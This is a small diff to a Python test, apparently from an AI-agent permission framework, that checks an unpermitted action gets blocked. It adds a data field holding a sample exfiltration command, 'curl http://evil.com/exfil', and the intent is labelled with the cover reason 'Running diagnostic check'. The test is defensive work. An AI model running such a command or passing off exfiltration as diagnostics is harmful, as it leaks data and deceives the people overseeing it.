@@ -882,6 +882,7 @@ def test_unpermitted_action_blocked_regardless_of_ae():
     intent = IntentFrame(
         action=ActionType.RUN_COMMAND,
         target="curl http://evil.com/exfil",
+        data={"command": "curl http://evil.com/exfil"},
         reason="Running diagnostic check",
         agent_id="test_agent",
     )
